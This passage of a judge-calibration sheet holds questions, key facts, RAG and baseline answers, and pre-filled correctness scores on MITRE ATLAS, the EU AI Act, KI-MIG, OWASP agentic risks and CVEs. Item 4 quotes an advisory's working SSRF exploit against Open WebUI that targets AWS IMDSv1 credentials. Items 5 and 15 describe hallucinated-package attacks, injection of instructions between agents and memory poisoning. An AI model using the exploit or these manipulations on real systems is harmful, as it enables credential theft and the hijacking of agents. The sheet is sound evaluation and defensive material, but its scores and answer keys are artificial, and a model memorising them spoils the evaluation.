# Judge calibration: label 40 answers

Score **correctness** only, from 1 to 5, by typing a digit after `**Score (1-5):**`.

**Pre-filled by Claude (Opus 5.5), not by a person.** Each score was checked against the primary
sources (atlas-data 2026.09, OWASP GenAI, CELLAR/EUR-Lex, gesetze-im-internet.de, NVD/GHSA/OSV/CISA
KEV) without looking at the judge's scores. Change any score you disagree with.

RAG and baseline answers are mixed in random order, and the id is hidden in the preview (it is
in an HTML comment). The sheet is not blind: an answer with a sources section is a RAG answer.

- **5** = all key facts and nothing wrong
- **3** = about half the key facts, or a minor error
- **1** = wrong, off topic, or none of the key facts
- An answer that declines scores 1, unless the key facts say the question is not answerable
  from the sources: then declining scores 5 and answering anyway scores 1.

The sources are the passages the judge saw with a RAG answer (baseline answers have none).
They help check whether a claim is false; correctness is judged against the key facts.

---

## 1. Which tactics does MITRE ATLAS define?

<!-- id: list-atlas-tactics:baseline -->

**Key facts**

- MITRE ATLAS defines 16 tactics: AI Model Access, AI Attack Adaptation, Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Defense Evasion, Discovery, Collection, Exfiltration, Impact, Privilege Escalation, Credential Access, Command and Control, Lateral Movement

**Answer**

> MITRE ATLAS currently defines 16 tactics:
>
> - Reconnaissance
> - Resource Development
> - AI Attack Adaptation
> - Initial Access
> - AI Model Access
> - Execution
> - Persistence
> - Privilege Escalation
> - Defense Evasion
> - Credential Access
> - Discovery
> - Lateral Movement
> - Collection
> - Command and Control
> - Exfiltration
> - Impact
>
> [MITRE ATLAS](https://atlas.mitre.org/)

**Score (1-5):** 5

*Claude's assessment:* Gives the right count (16) and names all 16 tactics correctly; no false claims. The order differs, but none was asked for.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 2. Was regelt Artikel 17 der Datenschutz-Grundverordnung zum Recht auf Löschung?

<!-- id: abstain-gdpr-17:baseline -->

**Key facts**

- The question is not answerable from the indexed sources; the correct response is to decline

**Answer**

> Artikel 17 DSGVO regelt das Recht auf Löschung („Recht auf Vergessenwerden“). Betroffene können vom Verantwortlichen verlangen, ihre personenbezogenen Daten unverzüglich zu löschen, wenn etwa die Daten für den ursprünglichen Zweck nicht mehr erforderlich sind, eine Einwilligung widerrufen wird und keine andere Rechtsgrundlage greift oder die Verarbeitung unrechtmäßig ist [DSGVO Art. 17(1)].
>
> Der Verantwortliche muss die Daten löschen, sofern keine Ausnahme gilt, etwa wenn die Verarbeitung zur Erfüllung einer rechtlichen Pflicht oder zur Ausübung der Meinungs- und Informationsfreiheit erforderlich ist [DSGVO Art. 17(3)].

**Score (1-5):** 1

*Claude's assessment:* The key facts say the question is outside the indexed sources and the correct response is to decline; the answer explains GDPR Art. 17 instead (accurately, but the rubric scores answering anyway as 1).

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 3. Wie viele Mitglieder hat die KI-Marktüberwachungskammer und wer führt den Vorsitz?

<!-- id: de-kimig-4-1:rag -->

**Key facts**

- Die KI-Marktüberwachungskammer hat drei Mitglieder
- Den Vorsitz führt der Präsident beziehungsweise die Präsidentin der Bundesnetzagentur

**Answer**

> „Die KI-Marktüberwachungskammer hat drei Mitglieder. Den Vorsitz der Kammer führt der Präsident beziehungsweise die Präsidentin der Bundesnetzagentur.“ [KI-MIG § 4 Abs. 1](https://www.gesetze-im-internet.de/ki-mig/__4.html)

<details><summary>2 sources the judge saw</summary>

**KI-MIG § 4 Abs. 1**

> (1) Die KI-Marktüberwachungskammer hat drei Mitglieder. Den Vorsitz der Kammer führt der Präsident beziehungsweise die Präsidentin der Bundesnetzagentur. Die Vizepräsidenten beziehungsweise -präsidentinnen der Bundesnetzagentur sind beisitzende Mitglieder. Die Entscheidungen der KI-Marktüberwachungskammer werden mit einfacher Mehrheit der Mitglieder getroffen. Bei Stimmengleichheit entscheidet die Stimme des Vorsitzenden beziehungsweise der Vorsitzenden.

**AI Act Art. 65(8)**

> Den Vorsitz im KI-Gremium führt einer der Vertreter der Mitgliedstaaten. Die Sekretariatsgeschäfte des KI-Gremiums werden vom Büro für Künstliche Intelligenz geführt; dieses beruft auf Anfrage des Vorsitzes die Sitzungen ein und erstellt die Tagesordnung im Einklang mit den Aufgaben des KI-Gremiums gemäß dieser Verordnung und seiner Geschäftsordnung.

</details>

**Score (1-5):** 5

*Claude's assessment:* Both key facts (three members, chaired by the President of the Bundesnetzagentur); quotes § 4 Abs. 1 word for word.

*Checked against:* <https://www.gesetze-im-internet.de/ki-mig/__4.html>, <https://www.recht.bund.de/bgbl/1/2026/223/regelungstext.pdf>

---

## 4. What is CVE-2026-45331, which package does it affect, and which version fixes it?

<!-- id: cve-cve-2026-45331:rag -->

**Key facts**

- It affects the open-webui package on PyPI, and the fix is in version 0.9.0.
- It is a server-side request forgery (SSRF) flaw in validate_url(), used by the RAG web search feature. IPv6 addresses, IPv4-mapped IPv6 addresses and some reserved IPv4 ranges get past the filter.
- Any authenticated user can reach internal addresses from the server, such as cloud metadata or localhost-bound services. Reaching AWS IMDSv1 can expose IAM credentials.

**Answer**

> CVE-2026-45331 is a full SSRF vulnerability in Open WebUI’s RAG web search feature. It affects all versions of the `open-webui` package on PyPI and is fixed in version 0.9.0. [CVE-2026-45331](https://nvd.nist.gov/vuln/detail/CVE-2026-45331)

<details><summary>2 sources the judge saw</summary>

**CVE-2026-45331**

> Affected: open-webui (PyPI) all versions, fixed in 0.9.0
> CVSS: 8.5 HIGH (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
> CWE: CWE-918
> CISA KEV: no
> Published: 2026-05-14
> Aliases: GHSA-4v7r-f4w8-8972, PYSEC-2026-2702
>
> Open WebUI has a full SSRF Vulnerability in the RAG Web Search Feature
>
> # SSRF Bypass via IPv6/IPv4-mapped IPv6/IPv4-reserved-ranges in `validate_url()`
>
> ## Summary
>
> `validate_url()` in `backend/open_webui/retrieval/web/utils.py` calls `validators.ipv6(ip, private=True)`, but the `validators` library does NOT implement the `private` keyword for IPv6 — the call raises a `ValidationError` (which is falsy in a boolean context), so every IPv6 address passes the filter. In addition, IPv4-mapped IPv6 (`::ffff:10.0.0.1`) bypasses the IPv4 check entirely, and several reserved IPv4 ranges (`0.0.0.0/8`, `100.64.0.0/10`, `192.0.0.0/24`, etc.) are not blocked.
>
> The vulnerability has existed since the `validate_url()` function was introduced and was NOT actually fixed by GHSA-c6xv-rcvw-v685 / CVE-2025-65958 despite that patch's intent. It affects every endpoint that calls `validate_url()`, including `/api/v1/retrieval/process/web`, `/api/v1/images/edit`, and others.
>
> ## Affected code
>
> `backend/open_webui/retrieval/web/utils.py validate_url()`:
>
> ```python
> if validators.ipv6(ip, private=True): # ValidationError is falsy — never raises
> raise ValueError(...)
> ```
>
> ## Proof of concept
>
> ```python
> import validators
> print(validators.ipv6("::1", private=True))
> # ValidationError(func=ipv6, args={'reason': "ipv6() got an unexpected keyword argument 'private'", ...})
> ```
>
> End-to-end exploit:
>
> ```python
> import requests, ipaddress
>
> OPEN_WEBUI_URL = "https://target"
> TOKEN = "..."
> TARGET_IPV4 = "169.254.169.254" # AWS IMDSv1
> mapped = "::ffff:" + TARGET_IPV4
>
> requests.post(f"{OPEN_WEBUI_URL}/api/v1/retrieval/process/web",
> headers={"Authorization": f"Bearer {TOKEN}"},
> json={"collection_name": "", "url": f"http://[{mapped}]/latest/meta-data/iam/security-credentials/"})
> ```
>
> ## Impact
>
> Any authenticated user can reach any internal IPv4/IPv6 address from the server process — cloud metadata, localhost-bound APIs, internal services. IMDSv1 reachability leads to IAM credential exfiltration.
>
> ## Recommended fix
>
> Replace the `validators` library calls with stdlib `ipaddress`:

**CVE-2026-45331**

> ```python
> import ipaddress
> addr = ipaddress.ip_address(ip)
> if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved or addr.is_unspecified:
> raise ValueError(...)
> # also unwrap IPv4-mapped IPv6 and re-check:
> if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
> addr_v4 = addr.ipv4_mapped
> if addr_v4.is_private or addr_v4.is_loopback or ...:
> raise ValueError(...)
> # plus explicit blocks for IANA reserved ranges (0.0.0.0/8, 100.64.0.0/10, etc. — see body for full list).
> ```
>
> ## Related but separate advisories
>
> - Redirect-bypass cluster: GHSA-rh5x-h6pp-cjj6
> - DNS rebinding TOCTOU: GHSA-h6x2-583h-x99r
> - urlparse / requests parsing-differential: GHSA-8w7q-q5jp-jvgx
> - Playwright loader redirect: GHSA-jrfp-m64g-pcwv
> - Missing `validate_url()` call in image_generations: GHSA-h7cc-wwjp-5xqh
>
> ## Credits
>
> - **Dor Konis (dkonis, GE Vernova)** — first to identify the `validators.ipv6(private=True)` silent-fail and IPv4-mapped IPv6 bypass; GHSA-4v7r-f4w8-8972 (this filing, 2024-09-11; credit explicitly requested in original report).
> - **wlayzz** — first to identify the unblocked IPv4 reserved ranges (0.0.0.0/8, 100.64.0.0/10, 192.0.2.0/24, 198.18.0.0/15, 203.0.113.0/24, etc.); GHSA-pxgj-3gvh-mfjv.
>
> Subsequent filings (GHSA-mggf-94hh-vp4w by vnth4nhnt, GHSA-xhgr-g5q7-jg6p by L1M1T-HACK) re-described the same root cause on the same or different endpoints and were closed as duplicates without advisory credit — fixing `validate_url()` once resolves all of them.

</details>

**Score (1-5):** 3

*Claude's assessment:* Package and fix (open-webui, 0.9.0) are right, and it names the SSRF in RAG web search. It leaves out validate_url() and the IPv6/IPv4-mapped bypasses, and says nothing on who can exploit it or what they reach (internal addresses, cloud metadata, IMDSv1 credentials). Nothing false: "all versions, fixed in 0.9.0" is loose wording for the GHSA's "<= 0.8.12", but the same set of releases, since 0.8.12 is the last release before 0.9.0 (PyPI) and OSV records introduced 0, fixed 0.9.0.

*Checked against:* <https://github.com/advisories/GHSA-4v7r-f4w8-8972>, <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-45331>, <https://api.osv.dev/v1/vulns/GHSA-4v7r-f4w8-8972>, <https://pypi.org/pypi/open-webui/json>

---

## 5. Can attackers take advantage of ChatGPT suggesting software packages that don't actually exist? How would that work, and has anyone shown it happening in practice?

<!-- id: freshness-aml-cs0022:baseline -->

**Key facts**

- LLMs like ChatGPT can hallucinate package names that aren't published in a package repository, and multiple LLMs can produce the same hallucination; an attacker could publish a malicious package under that name so users who download and load it allow arbitrary code execution.
- Researchers found ChatGPT recommending `pip install huggingface-cli`, a package that did not exist on PyPI (the real HuggingFace CLI is part of `huggingface_hub`).
- The researchers uploaded an empty package under the hallucinated name to PyPI and tracked over 30,000 downloads.

**Answer**

> Yes. This is often called **slopsquatting**: an attacker checks which nonexistent package names an AI coding assistant tends to suggest, registers one of those names on a package registry, and uploads a malicious package under it. If a developer later trusts the suggestion and installs it, the package can run malicious code and enter the project’s dependency chain.
>
> Researchers have demonstrated the pieces of this risk. A USENIX Security study tested 16 language models and found nonexistent package recommendations in generated code; it also cites earlier work that published a hallucinated package and observed downloads and incorporation into other projects’ dependencies. **That demonstrates the attack’s feasibility, but isn’t evidence here of a confirmed real-world compromise caused by a ChatGPT suggestion.** [USENIX Security 2025 study](https://www.usenix.org/system/files/usenixsecurity25-spracklen.pdf)

**Score (1-5):** 3

*Claude's assessment:* Explains the attack (register a hallucinated name, users install it, code runs) but misses that several LLMs repeat the same hallucination, never names huggingface-cli/huggingface_hub, and gives no empty package or 30,000-download figure. Its extra claims (USENIX'25 study) are accurate. Borderline 2/3.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>, <https://www.lasso.security/blog/ai-package-hallucinations>, <https://www.usenix.org/system/files/usenixsecurity25-spracklen.pdf>

---

## 6. Under the KI-MIG, who must keep the documentation that Article 18(1) of the AI Act requires when a provider in Germany ceases its business?

<!-- id: join-kimig-18-art-18:rag -->

**Key facts**

- Under KI-MIG § 18, when a provider or an authorised representative established in Germany ceases its business, the person responsible for liquidating or dissolving the legal entity has the obligation from Article 18(1)
- Article 18(1) requires keeping documentation such as the technical documentation, the quality management system documentation and the EU declaration of conformity available to national authorities for ten years after placing on the market or putting into service

**Answer**

> The person responsible for the liquidation or dissolution of the legal entity must fulfil the Article 18(1) documentation-retention duty. [KI-MIG § 18](https://www.gesetze-im-internet.de/ki-mig/__18.html) [AI Act Art. 18(1)](https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:02024R1689-20260727#art_18)

<details><summary>5 sources the judge saw</summary>

**AI Act Art. 18(1)**

> The provider shall, for a period ending 10 years after the high-risk AI system has been placed on the market or put into service, keep at the disposal of the national competent authorities:
>
> (a)
> the technical documentation referred to in Article 11;
>
> (b)
> the documentation concerning the quality management system referred to in Article 17;
>
> (c)
> the documentation concerning the changes approved by notified bodies, where applicable;
>
> (d)
> the decisions and other documents issued by the notified bodies, where applicable;
>
> (e)
> the EU declaration of conformity referred to in Article 47.

**AI Act Art. 18(2)**

> Each Member State shall determine conditions under which the documentation referred to in paragraph 1 remains at the disposal of the national competent authorities for the period indicated in that paragraph for the cases when a provider or its authorised representative established on its territory goes bankrupt or ceases its activity prior to the end of that period.

**AI Act Art. 18(3)**

> Providers that are financial institutions subject to requirements regarding their internal governance, arrangements or processes under Union financial services law shall maintain the technical documentation as part of the documentation kept under the relevant Union financial services law.

**KI-MIG § 18**

> Stellt ein Anbieter nach Artikel 3 Nummer 3 der Verordnung (EU) 2024/1689 oder ein in Deutschland niedergelassener Bevollmächtigter nach Artikel 3 Nummer 5 der Verordnung (EU) 2024/1689 seine Geschäftstätigkeit ein, so hat der für die Liquidation oder Auflösung der juristischen Person Verantwortliche die Pflicht aus Artikel 18 Absatz 1 der Verordnung (EU) 2024/1689.

**AI Act Art. 16(d)**

> (d) keep the documentation referred to in Article 18;

</details>

**Score (1-5):** 3

*Claude's assessment:* Names the liquidator/dissolver correctly under § 18 KI-MIG, but not which documents Art. 18(1) covers (technical documentation, QMS documentation, EU declaration of conformity) or the 10-year period. Nothing false (borderline 3/4).

*Checked against:* <https://www.gesetze-im-internet.de/ki-mig/__18.html>, <https://publications.europa.eu/resource/celex/02024R1689-20260727>, <https://www.recht.bund.de/bgbl/1/2026/223/regelungstext.pdf>

---

## 7. Which ATLAS techniques did it involve?

<!-- id: follow-up-techniques-cs0002:baseline -->

*Follow-up to:* What is the AML.CS0002 case study about?

**Key facts**

- AML.T0010.002 Data
- AML.T0016.000 Adversarial AI Attack Implementations
- AML.T0020 Training Data Poisoning
- AML.T0043 Craft Adversarial Data

**Answer**

> I can't answer that from the indexed sources.

**Score (1-5):** 1

*Claude's assessment:* Declines an answerable question; names none of the four techniques.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 8. Gibt es davon Ausnahmen?

<!-- id: follow-up-de-art-50-exceptions:baseline -->

*Follow-up to:* Was verlangt Art. 50 Abs. 1 KI-VO von Anbietern?

**Key facts**

- Die Informationspflicht entfällt, wenn es für eine angemessen informierte, aufmerksame und verständige Person aufgrund der Umstände offensichtlich ist, dass sie mit einem KI-System interagiert
- Sie gilt nicht für gesetzlich zur Aufdeckung, Verhütung, Ermittlung oder Verfolgung von Straftaten zugelassene KI-Systeme mit geeigneten Schutzvorkehrungen, es sei denn, sie stehen der Öffentlichkeit zur Anzeige einer Straftat zur Verfügung

**Answer**

> Ja. Die Informationspflicht entfällt, wenn für eine angemessen informierte, aufmerksame und verständige Person aufgrund der Umstände und des Nutzungskontexts offensichtlich ist, dass sie mit einem KI-System interagiert [KI-VO Art. 50 Abs. 1].

**Score (1-5):** 3

*Claude's assessment:* Gives the 'obvious to a reasonably informed person' exception correctly, but omits the exemption for AI systems authorised by law for criminal-offence detection and prosecution.

*Checked against:* <https://publications.europa.eu/resource/celex/02024R1689-20260727>

---

## 9. Which ATLAS mitigations address it?

<!-- id: follow-up-mitigate-t0035:rag -->

*Follow-up to:* What is AML.T0035?

**Key facts**

- AML.M0001 Limit Model Artifact Release
- AML.M0005 Control Access to AI Models and Data at Rest
- AML.M0012 Encrypt Sensitive Information
- AML.M0017 AI Model Distribution Methods

**Answer**

> The ATLAS mitigations listed for AML.T0035 are:
>
> - **Limit Model Artifact Release** [AML.M0001](https://atlas.mitre.org/mitigations/AML.M0001)
> - **Control Access to AI Models and Data at Rest** [AML.M0005](https://atlas.mitre.org/mitigations/AML.M0005)
> - **Encrypt Sensitive Information** [AML.M0012](https://atlas.mitre.org/mitigations/AML.M0012)
> - **AI Model Distribution Methods** [AML.M0017](https://atlas.mitre.org/mitigations/AML.M0017)

<details><summary>5 sources the judge saw</summary>

**AML.T0035**

> AI Artifact Collection (technique)
>
> Adversaries may collect AI artifacts for [Exfiltration](/tactics/AML.TA0010) or for use in [AI Attack Staging](/tactics/AML.TA0001).
> AI artifacts include models and datasets as well as other telemetry data produced when interacting with a model.

**AML.M0001**

> Limit Model Artifact Release (mitigation)
>
> Limit public release of technical project details including data, algorithms, model architectures, and model checkpoints that are used in production, or that are representative of those used in production.

**AML.M0005**

> Control Access to AI Models and Data at Rest (mitigation)
>
> Establish access controls on internal model registries and limit internal access to production models. Limit access to training data only to approved users.

**AML.M0012**

> Encrypt Sensitive Information (mitigation)
>
> Encrypt sensitive data such as AI models to protect against adversaries attempting to access sensitive data.

**AML.M0017**

> AI Model Distribution Methods (mitigation)
>
> Deploying AI models to edge devices can increase the attack surface of the system.
> Consider serving models in the cloud to reduce the level of access the adversary has to the model.
> Also consider computing features in the cloud to prevent gray-box attacks, where an adversary has access to the model preprocessing methods.

</details>

**Score (1-5):** 5

*Claude's assessment:* Lists all four mitigations of AML.T0035 (M0001, M0005, M0012, M0017) with correct names and IDs, and no extra or wrong ones.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 10. Attackers exploit vulnerabilities to change how an AI system behaves. Which AI Act provision requires high-risk AI systems to be resilient against this?

<!-- id: join-art15-resilience:rag -->

**Key facts**

- Article 15(5): high-risk AI systems shall be resilient against attempts by unauthorised third parties to alter their use, outputs or performance by exploiting system vulnerabilities

**Answer**

> “High-risk AI systems shall be resilient against attempts by unauthorised third parties to alter their use, outputs or performance by exploiting system vulnerabilities.” [AI Act Art. 15(5)](https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:02024R1689-20260727#art_15)

<details><summary>8 sources the judge saw</summary>

**AI Act Art. 15(5)**

> High-risk AI systems shall be resilient against attempts by unauthorised third parties to alter their use, outputs or performance by exploiting system vulnerabilities.

**Recital 76**

> Cybersecurity plays a crucial role in ensuring that AI systems are resilient against attempts to alter their use, behaviour, performance or compromise their security properties by malicious third parties exploiting the system’s vulnerabilities. Cyberattacks against AI systems can leverage AI specific assets, such as training data sets (e.g. data poisoning) or trained models (e.g. adversarial attacks or membership inference), or exploit vulnerabilities in the AI system’s digital assets or the underlying ICT infrastructure. To ensure a level of cybersecurity appropriate to the risks, suitable measures, such as security controls, should therefore be taken by the providers of high-risk AI systems, also taking into account as appropriate the underlying ICT infrastructure.

**AI Act Art. 15(4)**

> High-risk AI systems shall be as resilient as possible regarding errors, faults or inconsistencies that may occur within the system or the environment in which the system operates, in particular due to their interaction with natural persons or other systems. Technical and organisational measures shall be taken in this regard.

**AI Act Art. 16(a)**

> (a) ensure that their high-risk AI systems are compliant with the requirements set out in Section 2;

**AI Act Art. 15(1)**

> High-risk AI systems shall be designed and developed in such a way that they achieve an appropriate level of accuracy, robustness, and cybersecurity, and that they perform consistently in those respects throughout their lifecycle.

**AI Act Art. 9(3)**

> The risks referred to in this Article shall concern only those which may be reasonably mitigated or eliminated through the development or design of the high-risk AI system, or the provision of adequate technical information.

**AI Act Art. 47(3)**

> Where high-risk AI systems are subject to other Union harmonisation legislation which also requires an EU declaration of conformity, a single EU declaration of conformity shall be drawn up in respect of all Union law applicable to the high-risk AI system. The declaration shall contain all the information required to identify the Union harmonisation legislation to which the declaration relates.

**AI Act Art. 16(j)**

> (j) take the necessary corrective actions and provide information as required in Article 20;

</details>

**Score (1-5):** 5

*Claude's assessment:* Names Art. 15(5) and quotes its first subparagraph word for word.

*Checked against:* <https://publications.europa.eu/resource/celex/02024R1689-20260727>

---

## 11. Wie lautet der genaue Wortlaut von Artikel 79 Absatz 4 der KI-Verordnung (AI Act)?

<!-- id: german-legal-ai-act-art-79-4:baseline -->

**Key facts**

- Der Akteur sorgt dafür, dass alle geeigneten Korrekturmaßnahmen getroffen werden.
- Die Korrekturmaßnahmen betreffen alle betreffenden KI-Systeme.
- Gemeint sind die KI-Systeme, die der Akteur auf dem Unionsmarkt bereitgestellt hat.

**Answer**

> Artikel 79 Absatz 4 der Verordnung (EU) 2024/1689 lautet:
>
> > „Der Akteur sorgt dafür, dass alle geeigneten Korrekturmaßnahmen in Bezug auf alle betreffenden KI-Systeme, die er auf dem Unionsmarkt bereitgestellt hat, getroffen werden.“ [AI Act Art. 79(4)] ([EUR-Lex](https://eur-lex.europa.eu/eli/reg/2024/1689/oj/deu))

**Score (1-5):** 5

*Claude's assessment:* Quotes the German Art. 79 Abs. 4 word for word; all key facts.

*Checked against:* <https://publications.europa.eu/resource/celex/02024R1689-20260727>

---

## 12. Which ATLAS techniques did the Compromised PyTorch Dependency Chain case study (AML.CS0015) involve?

<!-- id: join-cs0015-techniques:baseline -->

**Key facts**

- AML.CS0015 employed AML.T0010.001 AI Software
- AML.CS0015 employed AML.T0025 Exfiltration via Cyber Means
- AML.CS0015 employed AML.T0037 Data from Local System

**Answer**

> The case study involved three ATLAS techniques:
>
> - [AML.T0010.001] AI Software
> - [AML.T0037] Data from Local System
> - [AML.T0025] Exfiltration via Cyber Means
>
> These correspond to the malicious PyTorch dependency, local data collection, and exfiltration. [MITRE ATLAS case study](https://1200km.com/attack-matrix/atlas/case-studies/)

**Score (1-5):** 5

*Claude's assessment:* Names all three employed techniques (T0010.001, T0037, T0025), and its mapping of each to a case-study step is accurate.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 13. What did Microsoft researchers call 'AI Recommendation Poisoning'?

<!-- id: fresh-recommendation-poisoning:baseline -->

**Key facts**

- AML.CS0072: a widespread pattern of AI assistant memory manipulation for promotional purposes
- It uses pre-filled prompts passed to AI assistants through a URL query parameter in crafted links

**Answer**

> I can't answer that from the indexed sources.

**Score (1-5):** 1

*Claude's assessment:* Declines an answerable question; states neither key fact.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 14. Wie hoch ist der gesetzliche Mindestlohn in Deutschland?

<!-- id: abstain-mindestlohn:rag -->

**Key facts**

- The question is not answerable from the indexed sources

**Answer**

> I can't answer that from the indexed sources.
>
> Nennen Sie am besten, worum es geht: eine Technik-ID wie AML.T0051, einen OWASP-Eintrag wie LLM01 oder einen Artikel der KI-VO wie Art. 50.
>
> Die Wissensbasis umfasst:
>
> - AI package vulnerabilities (NVD, GitHub Advisory Database via OSV, CISA KEV)
> - EU AI Act (Regulation (EU) 2024/1689)
> - KI-MIG (KI-Marktüberwachungs- und Innovationsförderungsgesetz)
> - MITRE ATLAS
> - OWASP Top 10 for Agentic Applications 2026
> - OWASP Top 10 for LLM Applications 2026
>
> *KI-generierte Antwort (Art. 50 Abs. 1 KI-VO). Bitte prüfen Sie die Quellen.*

**Score (1-5):** 5

*Claude's assessment:* Correctly declines an out-of-scope question and lists what the knowledge base covers.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 15. What is ASI07 (Insecure Inter-Agent Communication) and how is it different from ASI03 and ASI06?

<!-- id: id-exact-asi07:rag -->

**Key facts**

- ASI07 occurs when exchanges between agents lack proper authentication, integrity, or semantic validation, which allows interception, spoofing, or manipulation of agent messages and intents.
- ASI07 focuses on compromising real-time messages between agents, while ASI03 focuses on credential and permissions misuse and ASI06 targets stored knowledge corruption.
- The threat spans transport, routing, discovery, and semantic layers, including covert or side-channels, and can lead to misinformation, privilege confusion, or coordinated manipulation across distributed agentic systems.

**Answer**

> **ASI07 (Insecure Inter-Agent Communication)** is the risk that communications between autonomous agents lack adequate authentication, integrity or semantic validation, allowing messages or intentions to be intercepted, spoofed, manipulated or blocked. It concerns real-time exchanges across agents, including their transport, routing and meaning. [ASI07](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
>
> - **ASI03 (Identity and Privilege Abuse)** concerns misuse of identities, credentials, delegation or permissions to gain or exercise unauthorized access. ASI07 concerns compromising the *messages between agents*; ASI03 concerns *who an agent is and what it can do*. [ASI07](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) [ASI03](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> - **ASI06 (Memory & Context Poisoning)** concerns corrupting stored or retrievable information so it biases future reasoning or actions. ASI07 targets communications in transit between agents, whereas ASI06 targets retained context or memory. [ASI07](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) [ASI06](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

<details><summary>8 sources the judge saw</summary>

**ASI07**

> Multi agent systems depend on continuous communication between autonomous agents that coordinate via APIs, message buses, and shared memory, significantly expanding the attack surface. Decentralized architecture, varying autonomy, and uneven trust make perimeter-based security models ineffective. Weak inter-agent controls for authentication, integrity, confidentiality, or authorization let attackers intercept, manipulate, spoof, or block messages. Insecure Inter-Agent Communication occurs when these exchanges lack proper authentication, integrity, or semantic validation-allowing interception, spoofing, or manipulation of agent messages and intents. The threat spans transport, routing, discovery, and semantic layers, including covert or side-channels where agents leak or infer data through timing or behavioral cues. This differs from ASI03 (Identity & Privilege Abuse), which focuses on credential and permissions misuse, and ASI06 (Memory & Context Poisoning), which targets stored knowledge corruption. ASI07 focuses on compromising real-time messages between agents, leading to misinformation, privilege confusion, or coordinated manipulation across distributed agentic systems. The entry is covered by T12 – Agent Communication Poisoning & T16 – Insecure Inter-Agent Protocol Abuse in Agentic Threats and Mitigations

**ASI07**

> 1. Unencrypted and channels enabling semantic manipulation: MITM intercepts unencrypted messages and injects hidden instructions altering agent goals and decision logic.
> 2. Message tampering leading to cross-context contamination:: Modified or injected messages blur task boundaries between agents, leading to data leakage or goal confusion during coordination.
> 3. Replay on trust chains: Replayed delegation or trust messages trick agents into granting access or honoring stale instructions.
> 4. Protocol downgrade and descriptor forgery, causing authority confusion: Attackers coerce agents into weaker communication modes or spoof agent descriptors, making malicious commands appear as valid exchanges.
>
> 5. Message-routing attacks on discovery and coordination: Misdirected discovery traffic forges relationships with malicious agents or unauthorized coordinators.
> 6. Metadata analysis for behavioral profiling: Traffic patterns reveal decision cycles and relationships, enabling prediction and manipulation of agent behavior.

**ASI07**

> 1. Secure agent channels: Use end-to-end encryption with per-agent credentials and mutual authentication. Enforce PKI certificate pinning, forward secrecy, and regular protocol reviews to prevent interception or spoofing.
> 2. Message integrity and semantic protection: Digitally sign messages, hash both payload and context, and validate for hidden or modified natural-language instructions. Apply natural-language– aware sanitization and intent-diffing to detect goal, parameter tampering, hidden or modified natural-language instructions
> 3. Agent-aware anti-replay: Protect all exchanges with nonces, session identifiers, and timestamps tied to task windows. Maintain short-term message fingerprints or state hashes to detect cross- context replays.

**ASI06**

> Agentic systems rely on stored and retrievable information which can be a snapshot of its conversation history, a memory tool or expanded context, which supports continuity across tasks and reasoning cycles. Context includes any information an agent retains, retrieves, or reuses, such as summaries, embeddings, and RAG stores but excludes one-time input prompts covered under LLM01 :2025 Prompt Injection. In Memory and Context Poisoning, adversaries corrupt or seed this context with malicious or misleading data, causing future reasoning, planning, or tool use to become biased, unsafe, or aid exfiltration. Ingestion sources such as uploads, API feeds, user input, or peer-agent exchanges may be untrusted or only partially validated. This risk is distinct from ASI01 (Goal Hijack), which captures direct goal manipulation, and ASI08 (Cascading Failures), which describes degradation after poisoning occurs. However, memory poisoning frequently leads to goal hijacking (ASI01), as corrupted context or long-term memory can alter the agent’s goal interpretation, reasoning path, or tool-selection logic. It builds on LLM01:2025 Prompt Injection, LLM04:2025 Data and Model Poisoning, and LLM08:2025 Vector and Embedding Weaknesses, but focuses on persistent corruption of agent memory and retrievable context that propagates across sessions and alters autonomous reasoning. It maps to T1 Memory Poisoning in Agentic Threats and Mitigations, with related impacts in T4 Memory Overload, T6 Broken Goals, and T12 Shared Memory Poisoning. In AIVSS, the AARS fields Memory Use and Contextual Awareness raise the agentic vulnerability score.

**ASI03**

> 1. Un-scoped Privilege Inheritance. Occurs when a high-privilege manager delegates tasks without applying least-privilege scoping-often for convenience or due to architectural limits-passing its full access context. A narrow worker then receives excessive rights. Low- or no-code agents with default privileges, such as unrestricted Internet access, also inherit more authority than intended.
> 2. Memory-Based Privilege Retention & Data Leakage. Arises when agents cache credentials, keys, or retrieved data for context and reuse. If memory is not segmented or cleared between tasks or users,
>
> attackers can prompt the agent to reuse cached secrets, escalate privileges, or leak data from a prior secure session into a weaker one.
> 3. Cross-Agent Trust Exploitation (Confused Deputy). In multi-agent systems, agents often trust internal requests by default. A compromised low-privilege agent can relay valid-looking instructions to a high-privilege agent, which executes them without re-checking the original user’s intent- misusing its elevated permissions.
> 4. Time-of-Check to Time-of-Use (TOCTOU) in Agent Workflows. Permissions may be validated at the start of a workflow but change or expire before execution. The agent continues with outdated authorization, performing actions the user no longer has rights to approve.
> 5. Synthetic Identity Injection. Attackers impersonate internal agents by using unverified descriptors (e.g., “Admin Helper”) to gain inherited trust and perform privileged actions under a fabricated identity.

**ASI06**

> 1. Travel Booking Memory Poisoning: An attacker keeps reinforcing a fake flight price, the assistant stores it as truth, then approves bookings at that price and bypasses payment checks.
> 2. Context Window Exploitation: The attacker splits attempts across sessions so earlier rejections drop out of context, and the AI eventually grants escalating permissions up to admin access.
